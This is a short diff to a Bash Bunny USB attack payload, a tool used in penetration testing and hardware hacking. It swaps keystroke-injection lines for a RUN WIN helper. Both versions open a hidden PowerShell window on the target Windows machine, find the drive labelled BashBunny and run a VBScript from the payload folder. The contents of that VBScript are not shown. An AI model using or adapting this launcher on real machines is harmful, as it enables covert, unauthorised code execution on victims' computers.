@@ -35,10 +35,7 @@ fi
 LED ATTACK
 
 # Run the VBScript
-QUACK GUI r
-QUACK DELAY 100
-QUACK STRING powershell -WindowStyle Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\a.vbs')"
-QUACK ENTER
+RUN WIN "powershell -WindowStyle Hidden \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\a.vbs')\""
 
 # Green 1000ms VERYFAST blink followed by SOLID
 LED FINISH
